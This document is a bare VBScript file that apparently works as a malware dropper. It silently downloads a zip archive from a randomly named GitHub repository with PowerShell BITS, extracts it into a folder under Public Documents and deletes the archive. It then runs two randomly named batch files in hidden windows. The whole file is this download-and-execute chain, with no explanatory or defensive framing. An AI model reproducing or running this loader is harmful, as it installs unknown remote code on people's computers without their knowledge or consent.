Option Explicit
Dim fso, shell, publicDocs, baseDir, zipPath, outDir, url
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"
baseDir = publicDocs & "\keys"
If Not fso.FolderExists(baseDir) Then
    fso.CreateFolder(baseDir)
End If
zipPath = baseDir & "\assets.zip"
outDir = baseDir
url = "https://github.com/Gelli08/spwww743g7w/archive/refs/heads/main.zip"
Dim bitsCmd
bitsCmd = "powershell -NoLogo -NoProfile -Command ""Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "' -ErrorAction Stop"""
shell.Run bitsCmd, 0, True
shell.Run "powershell -NoLogo -NoProfile -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & outDir & "' -Force""", 0, True
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
Dim folder, gitFolder
gitFolder = ""
For Each folder In fso.GetFolder(outDir).SubFolders
    If InStr(folder.Name, "-main") > 0 Or InStr(folder.Name, "-master") > 0 Then
        gitFolder = folder.Path
        Exit For
    End If
Next
If gitFolder <> "" Then
    Dim f, subf
    For Each f In fso.GetFolder(gitFolder).Files
        f.Move baseDir & "\" & f.Name
    Next
    For Each subf In fso.GetFolder(gitFolder).SubFolders
        subf.Move baseDir & "\" & subf.Name
    Next
    If fso.FolderExists(gitFolder) Then fso.DeleteFolder gitFolder, True
End If
shell.Run """" & baseDir & "\wg43w78tw4grun.bat" & """", 0, False
Do
    WScript.Sleep 500
Loop While ProcessRunning("wg43w78tw4grun.bat")
shell.Run """" & baseDir & "\vw2i45ibzfrun2.bat" & """", 0, False
Function ProcessRunning(procName)
    Dim svc, procs
    Set svc   = GetObject("winmgmts:root\cimv2")
    Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & procName & "'")
    ProcessRunning = (procs.Count > 0)
End Function
